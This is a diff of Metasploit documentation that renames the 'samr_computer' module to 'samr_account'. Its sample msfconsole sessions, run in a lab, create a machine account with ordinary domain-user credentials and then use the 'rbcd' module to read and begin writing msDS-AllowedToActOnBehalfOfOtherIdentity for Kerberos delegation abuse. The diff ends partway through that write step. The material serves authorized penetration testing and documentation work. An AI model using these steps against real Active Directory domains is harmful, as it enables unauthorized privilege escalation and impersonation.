@@ -62,14 +62,14 @@ PropagationFlags      : None
 
 ## Module usage
 
-The `admin/dcerpc/samr_computer` module is generally used to first create a computer account, which requires no permissions:
+The `admin/dcerpc/samr_account` module is generally used to first create a computer account, which by default, all user accounts in a domain can perform:
 
 1. From msfconsole
-2. Do: `use auxiliary/admin/dcerpc/samr_computer`
+2. Do: `use auxiliary/admin/dcerpc/samr_account`
 3. Set the `RHOSTS`, `SMBUser` and `SMBPass` options
-   a. For the `ADD_COMPUTER` action, if you don't specify `COMPUTER_NAME` or `COMPUTER_PASSWORD` - one will be generated automatically
-   b. For the `DELETE_COMPUTER` action, set the `COMPUTER_NAME` option
-   c. For the `LOOKUP_COMPUTER` action, set the `COMPUTER_NAME` option
+   a. For the `ADD_COMPUTER` action, if you don't specify `ACCOUNT_NAME` or `ACCOUNT_PASSWORD` - one will be generated automatically
+   b. For the `DELETE_ACCOUNT` action, set the `ACCOUNT_NAME` option
+   c. For the `LOOKUP_ACCOUNT` action, set the `ACCOUNT_NAME` option
 4. Run the module and see that a new machine account was added
 
 Then the `auxiliary/admin/ldap/rbcd` can be used:
@@ -121,19 +121,30 @@ with the Service for User (S4U) Kerberos extension.
 First create the computer account:
 
 ```msf
-msf6 auxiliary(admin/dcerpc/samr_computer) > show options
+msf6 auxiliary(admin/dcerpc/samr_account) > show options
 
-Module options (auxiliary/admin/dcerpc/samr_computer):
+   Name              Current Setting  Required  Description
+   ----              ---------------  --------  -----------
+   ACCOUNT_NAME                       no        The account name
+   ACCOUNT_PASSWORD                   no        The password for the new account
 
-   Name               Current Setting  Required  Description
-   ----               ---------------  --------  -----------
-   COMPUTER_NAME                       no        The computer name
-   COMPUTER_PASSWORD                   no        The password for the new computer
-   RHOSTS                              yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
-   RPORT              445              yes       The target port (TCP)
-   SMBDomain          .                no        The Windows domain to use for authentication
-   SMBPass                             no        The password for the specified username
-   SMBUser                             no        The username to authenticate as
+
+   Used when connecting via an existing SESSION:
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SESSION                   no        The session to run this module on
+
+
+   Used when making a new connection via RHOSTS:
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   RHOSTS                      no        The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT      445              yes       The target port (TCP)
+   SMBDomain  .                no        The Windows domain to use for authentication
+   SMBPass                     no        The password for the specified username
+   SMBUser                     no        The username to authenticate as
 
 
 Auxiliary action:
@@ -143,13 +154,13 @@ Auxiliary action:
    ADD_COMPUTER  Add a computer account
 
 
-msf6 auxiliary(admin/dcerpc/samr_computer) > set RHOSTS 192.168.159.10
+msf6 auxiliary(admin/dcerpc/samr_account) > set RHOSTS 192.168.159.10
 RHOSTS => 192.168.159.10
-msf6 auxiliary(admin/dcerpc/samr_computer) > set SMBUser sandy
+msf6 auxiliary(admin/dcerpc/samr_account) > set SMBUser sandy
 SMBUser => sandy
-msf6 auxiliary(admin/dcerpc/samr_computer) > set SMBPass Password1!
+msf6 auxiliary(admin/dcerpc/samr_account) > set SMBPass Password1!
 SMBPass => Password1!
-msf6 auxiliary(admin/dcerpc/samr_computer) > run
+msf6 auxiliary(admin/dcerpc/samr_account) > run
 [*] Running module against 192.168.159.10
 
 [*] 192.168.159.10:445 - Using automatically identified domain: MSFLAB
@@ -157,7 +168,7 @@ msf6 auxiliary(admin/dcerpc/samr_computer) > run
 [+] 192.168.159.10:445 -   Password: A2HPEkkQzdxQirylqIj7BxqwB7kuUMrT
 [+] 192.168.159.10:445 -   SID:      S-1-5-21-3402587289-1488798532-3618296993-1655
 [*] Auxiliary module execution completed
-msf6 auxiliary(admin/dcerpc/samr_computer) > use auxiliary/admin/ldap/rbcd
+msf6 auxiliary(admin/dcerpc/samr_account) > use auxiliary/admin/ldap/rbcd
 ```
 
 Now use the RBCD module to read the current value of `msDS-AllowedToActOnBehalfOfOtherIdentity`:
@@ -181,7 +192,7 @@ msf6 auxiliary(admin/ldap/rbcd) > read
 [*] Auxiliary module execution completed
 ```
 
-Writing a new `msDS-AllowedToActOnBehalfOfOtherIdentity` value using the computer account created by `admin/dcerpc/samr_computer`:
+Writing a new `msDS-AllowedToActOnBehalfOfOtherIdentity` value using the computer account created by `admin/dcerpc/samr_account`:
 
 ```msf
 msf6 auxiliary(admin/ldap/rbcd) > set DELEGATE_FROM DESKTOP-QLSTR9NW$
